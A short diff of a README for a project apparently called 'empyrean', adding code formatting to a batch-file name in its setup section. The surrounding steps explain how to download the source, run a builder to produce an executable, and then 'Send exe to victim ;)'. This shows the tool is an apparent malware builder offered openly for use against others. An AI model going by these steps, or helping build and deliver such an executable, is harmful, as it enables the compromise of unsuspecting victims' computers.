@@ -31,7 +31,7 @@
 
 #### Setup
 1. Download and extract the [source code](https://github.com/addi00000/empyrean/archive/refs/heads/main.zip)
-2. If you have never installed python before run install_python.bat
+2. If you have never installed python before run `install_python.bat`
 3. Run the builder by double clicking the `build.bat` file
 4. Follow instructions in builder and your exe will be in the same directory
 5. Send exe to victim ;)
